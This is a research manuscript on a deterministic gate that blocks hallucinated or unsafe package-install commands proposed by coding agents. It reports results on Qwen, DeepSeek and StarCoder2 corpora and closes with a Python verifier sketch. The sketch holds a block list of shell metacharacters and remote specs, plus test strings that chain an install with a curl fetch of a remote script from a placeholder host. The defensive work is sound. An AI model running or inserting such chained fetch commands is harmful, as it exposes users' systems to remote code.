# Deterministic Tool-Boundary Gates for Agentic Package-Install Hallucination

Date: 2026-07-05

Praxis ID: `PX-050`

Status: **FINAL MANUSCRIPT DRAFT - PUBLISHABLE BOUNDED POSITIVE**

## Abstract

Tool-using coding agents can convert package hallucinations into executable install commands. PX-050 evaluates a deterministic tool-boundary gate for inert PyPI/NPM package-install command strings generated by open-weight coding models, parser-stress mutations, controller/extractor repairs, and dry-run live-agent tool-call proposals. The gate parses package-manager commands, blocks unsafe shell composition and remote/file package specifications, and checks all parsed package names against a frozen valid-package set before allowing execution. Across a fixed adaptive fixture, Qwen2.5-Coder live generations, DeepSeek-Coder live generations, and a 984-row parser-stress appendix, the hardened gate produced zero observed invalid-package escapes while preserving high valid-command utility. Raw and strict one-line held-out StarCoder2 gates failed registered promotion thresholds and are reported as boundary evidence, not as raw-output third-model replication. PX-050S then tested the implementation update identified by PX-050R: a controller extracts the requested target install command before verification and routes misses to review. On a fresh StarCoder2 held-out namespace, PX-050S produced zero invalid allows over `440` generated command rows while preserving valid allow rate `1.0000` on both StarCoder2 models. PX-050T stress-tested the repaired controller on `1,440` crafted raw-output strings and again observed zero invalid allows, while a registry-only baseline would have allowed `300` invalid cases. PX-050U/PX-050V then prompted Qwen2.5-Coder-7B and DeepSeek-Coder-6.7B as dry-run coding agents over `288` combined tool-call tasks; both models proposed install actions on every row, raw/no-gate exposure appeared on `121/128` invalid tasks, and the controller/extractor plus hardened verifier allowed `0` invalid installs while allowing `160/160` valid installs. The result supports a narrow deployment claim: deterministic verification at the package-install tool boundary can prevent a concrete class of agentic package-install hallucination from reaching execution on the measured positive corpora. It does not claim general supply-chain security, malicious-package detection, arbitrary-shell safety, package-manager execution safety, broad live-agent safety, or hidden chain-of-thought monitoring.

## Praxis Summary

**Praxis thesis:** A deterministic package-install verifier can block invalid or policy-unsafe model-generated install command strings before they reach a tool boundary, while preserving useful valid package installs.

**Objective:** Test whether a frozen parser and verifier remain robust under fixed adaptive cases, live model-generated commands from two open-weight coding models, parser-stress mutations derived from those live commands, controller/extractor repairs, and dry-run live-agent tool-call proposals.

**Research question:** Can deterministic tool-boundary validation close package-install hallucination gaps without inspecting model reasoning or executing package managers?

**Hypothesis:** If all package-install tool calls are parsed before execution, and the verifier blocks invalid packages, remote/file package specs, shell composition, aliases, and mixed valid/invalid dependency sets, then invalid package-install command strings will have zero observed hardened escapes while clean valid commands remain mostly usable.

## 1. Problem

Coding agents often propose package-install actions. A generated command such as `pip install plausible-helper-name` or `npm install plausible-agent-library` can look normal even when the package name is invalid. In a tool-using agent, the failure mode is sharper than a bad answer: the string can cross from text into an execution boundary.

PX-050 treats package-install commands as structured tool-call arguments. The model is allowed to generate command strings, but the verifier decides whether those strings can pass the boundary.

The experiment asks a bounded, deployment-facing question:

> Can a deterministic package-install gate block invalid or policy-unsafe model-generated install command strings while preserving valid package-install utility?

## 2. Threat Model And Boundary

PX-050 covers command strings that look like Python or JavaScript package-manager installs. The evaluated ecosystems are PyPI and NPM. Commands are inert: no package manager is executed during evaluation.

The hardened gate blocks:

- invalid package names,
- mixed valid and invalid package arguments,
- package-manager aliases that hide the installed package,
- remote, file, or URL package specifications,
- shell metacharacters and command composition,
- non-install shell content embedded in an install-like command.

The gate allows clean valid package-install commands when every parsed package name is in the frozen valid-package set.

PX-050 does not cover:

- malicious packages that really exist in a registry,
- arbitrary shell commands outside the modeled install boundary,
- dependency confusion across private registries,
- post-install scripts or package behavior after execution,
- broad software supply-chain security,
- hidden chain-of-thought or model-internal monitoring.

## 3. Method

### 3.1 Conditions

PX-050 compares three policy conditions:

| Condition | Purpose |
|---|---|
| Naive / allow-style baseline | Measures how many invalid install-like strings pass without meaningful validation. |
| Registry-only gate | Checks parsed package existence but does not fully block composition and policy-unsafe syntax. |
| Hardened deterministic gate | Parses the command and blocks invalid packages, unsafe syntax, remote/file specs, aliases, and mixed invalid sets. |

The claim is centered on the hardened gate. Registry-only validation is included because a registry checker is the natural baseline for package hallucination defense.

PX-050S then reran a fresh StarCoder2 namespace with the controller/extractor repair and passed. PX-050U/PX-050V add two-model live-agent-style tool-call evidence, but still as dry-run boundary tests with no package-manager execution. The raw/strict runs are boundary evidence; PX-050S, PX-050U, and PX-050V are positive deployment-repair evidence within the stated boundary.

### 3.3 Gate Logic

The parser recognizes common package-install forms:

- `pip install ...`
- `python -m pip install ...`
- `npm install ...`
- `npm i ...`
- `npm add ...`
- `pnpm install/add ...`
- `yarn add ...`

Package specs are normalized before lookup. Python names are normalized with the PyPI dash/underscore/dot convention. NPM names are lowercased and version suffixes are stripped without collapsing scoped package names.

The hardened gate returns:

| Decision | Meaning |
|---|---|
| `allow` | Command parsed, no unsafe syntax found, and every package is in the valid set. |
| `block` | Invalid package, remote/file spec, shell composition, alias spec, or embedded unsafe content detected. |
| `review` | The command is not confidently handled by the modeled parser. |

Only `allow` represents an execution-permitted decision.

## 5. Supported Claim

PX-050 supports this claim:

> On measured PyPI/NPM package-install command-string corpora, a deterministic tool-boundary gate blocked invalid or policy-unsafe model-generated install strings with zero observed hardened invalid-package escapes while preserving high valid-command utility.

The claim is positive because it holds across:

- `138` fixed adaptive commands,
- `196` live generated commands across Qwen and DeepSeek,
- `984` parser-stress mutations,
- `440` fresh StarCoder2 controller/extractor repair commands,
- `1,440` crafted controller/extractor adaptive stress rows,
- `288` dry-run live-agent tool-call rows across two model families,
- policy and provenance refreshes over the combined 288-row live-agent tool-call corpus.

The raw and strict one-line held-out StarCoder2 runs are excluded from any raw third-model replication claim because they failed registered promotion gates. PX-050S is included only as controller/extractor deployment-repair evidence, PX-050T is included only as crafted command-string stress evidence, and PX-050U/PX-050V are included only as dry-run live-agent-style tool-call evidence. The claim is bounded because execution, package reputation, malicious existing packages, arbitrary shell safety, private registry behavior, broad live-agent safety, and cross-model prompt-compliance failures are outside the positive claim.

## 6. Interpretation

PX-050 is practically valuable because it turns a model-output safety problem into a deterministic boundary-control problem. The model can be uncertain, creative, or wrong. The tool boundary still has a simple job: parse the action and reject anything outside the allowed package-install policy.

The Qwen/DeepSeek contrast is especially useful for defense. Qwen shows the gap that the hardened gate closes beyond registry-only checking. DeepSeek shows that not every model will generate the same bypass surface. The honest message is stronger than a forced universal claim: deterministic boundary gates can be useful even when the comparative uplift varies by model distribution.

## 7. Limitations

PX-050 has six important limits:

1. The experiment is command-string and tool-boundary evidence only. It does not execute package managers.
2. The valid-package set is frozen for the experiment. A deployed system would need live registry checks, pinning, caching, and failure handling.
3. The gate blocks invalid names and unsafe syntax, not malicious packages that actually exist.
4. The parser covers common PyPI/NPM install forms, not every package manager, shell, operating system, or private registry configuration.
5. The raw and strict one-line held-out StarCoder2 boundary runs failed registered gates, showing that raw-output compliance and prompt-label scoring are not enough for a broader raw third-model replication claim. PX-050S shows a controller/extractor repair can still produce a passed deployment-shaped result, PX-050T shows that repair held against crafted string-level attacks, and PX-050U/PX-050V show the same boundary pattern can hold in two dry-run live-agent tool-call harnesses.
6. PX-050U/PX-050V are dry-run evidence only. They do not execute package managers, measure post-install behavior, or prove broad agent safety.

These limitations do not invalidate the result. They define the deployment boundary.

## 8. Ethics And Safety

All commands are inert and evaluated as strings. The experiment does not install packages, publish packages, probe package registries for abuse, or provide operational instructions for package squatting. The safety value is defensive: keep model-generated install strings from crossing into execution unless they satisfy a deterministic policy.

## Appendix A: Transportable Verifier Sketch

The full implementation lives in the repository paths listed above. This compact sketch captures the core boundary-control pattern used by PX-050.

```python
#!/usr/bin/env python3
"""
PX-050 portable deterministic package-install gate sketch.

Purpose:
    Demonstrate the boundary-control pattern behind the PX-050 positive
    result. The full experiment runners add model generation, row logging,
    mutation stress tests, and report rendering.

Safety:
    This code evaluates command strings only. It does not execute package
    managers or shell commands.
"""

import re


VALID_PYPI = {"requests", "numpy", "pandas", "fastapi", "pytest"}
VALID_NPM = {"react", "express", "lodash", "axios", "typescript"}

SHELL_META = ("&&", ";", "|", "`", "$(", ">", "<", "\n", "\r")
REMOTE_SPECS = ("http://", "https://", "git+", "file:", "ftp://")


def normalize_pypi_name(value: str) -> str:
    return re.sub(r"[-_.]+", "-", value).lower()


def strip_python_spec(token: str) -> str:
    token = token.strip().strip("'\"")
    token = token.split("[", 1)[0]
    token = re.split(r"(?:===|==|~=|!=|<=|>=|<|>)", token, maxsplit=1)[0]
    return normalize_pypi_name(token)


def strip_npm_spec(token: str) -> str:
    token = token.strip().strip("'\"")
    if token.startswith("@"):
        parts = token.rsplit("@", 1)
        if len(parts) == 2 and "/" in parts[0]:
            return parts[0].lower()
        return token.lower()
    return token.split("@", 1)[0].lower()


def tokenize_args(args: str) -> list[str]:
    return [
        raw.strip()
        for raw in re.split(r"\s+", args.strip())
        if raw.strip() and not raw.strip().startswith("-")
    ]


def parse_install(command: str) -> dict:
    lowered = f" {command.lower()} "
    if any(marker in lowered for marker in REMOTE_SPECS):
        return {"handled": True, "ecosystem": "unknown", "packages": [], "unsafe": True}
    if any(marker in command for marker in SHELL_META):
        return {"handled": True, "ecosystem": "unknown", "packages": [], "unsafe": True}
    if "@npm:" in lowered:
        return {"handled": True, "ecosystem": "npm", "packages": [], "unsafe": True}

    pip_match = re.search(
        r"(?:python\s+-m\s+)?pip(?:3)?\s+install\s+(?P<args>.+)$",
        command,
        flags=re.IGNORECASE,
    )
    if pip_match:
        packages = [strip_python_spec(token) for token in tokenize_args(pip_match.group("args"))]
        return {"handled": bool(packages), "ecosystem": "pypi", "packages": packages, "unsafe": False}

    npm_match = re.search(
        r"(?:npm\s+(?:install|i|add)|pnpm\s+(?:install|add)|yarn\s+add)\s+(?P<args>.+)$",
        command,
        flags=re.IGNORECASE,
    )
    if npm_match:
        packages = [strip_npm_spec(token) for token in tokenize_args(npm_match.group("args"))]
        return {"handled": bool(packages), "ecosystem": "npm", "packages": packages, "unsafe": False}

    return {"handled": False, "ecosystem": "unknown", "packages": [], "unsafe": False}


def package_exists(ecosystem: str, package: str) -> bool:
    if ecosystem == "pypi":
        return normalize_pypi_name(package) in VALID_PYPI
    if ecosystem == "npm":
        return package.lower() in VALID_NPM
    return False


def hardened_gate(command: str) -> str:
    parsed = parse_install(command)
    if parsed["unsafe"]:
        return "block"
    if not parsed["handled"] or not parsed["packages"]:
        return "review"
    if all(package_exists(parsed["ecosystem"], package) for package in parsed["packages"]):
        return "allow"
    return "block"


def main() -> None:
    examples = [
        "pip install requests",
        "pip install requests fake-helper-20260705",
        "npm install react",
        "npm install https://example.invalid/pkg.tgz",
        "python -m pip install numpy && curl https://example.invalid/run.sh",
    ]
    for command in examples:
        print(f"{hardened_gate(command):6s} {command}")


if __name__ == "__main__":
    main()
```
